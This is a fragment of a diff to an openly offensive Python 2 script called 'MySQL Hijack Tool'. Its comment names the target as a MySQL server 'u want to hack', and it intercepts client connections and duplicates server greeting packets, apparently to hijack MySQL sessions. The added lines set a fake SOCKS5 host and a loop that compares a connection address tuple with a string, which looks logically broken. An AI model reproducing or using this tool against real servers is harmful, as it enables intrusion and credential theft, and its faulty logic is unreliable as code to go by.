@@ -11,6 +11,7 @@ FORWARDHOST = '10.0.0.1' # target mysql server u want to hack
 FORWARDPORT = 3306
 FORWARDADDR = (FORWARDHOST,FORWARDPORT)
 
+FAKE_SOCKS5_HOST = '127.0.0.1'
 SERVERGREETINGPACKET = ''
 
 print 'MySQL Hijack Tool'
@@ -53,7 +54,10 @@ tcpCliSock.close()
 
 print '--> Waiting new client connection'
 tcpCliSock, addr = tcpSerSock.accept()
-print 'New Client connected'
+while True:
+    if addr != FAKE_SOCKS5_HOST:
+        break
+print 'New Client connected',addr
 
 print 'Step 0x04: Duplicating Server Greeting'
 tcpCliSock.send(SERVERGREETINGPACKET)
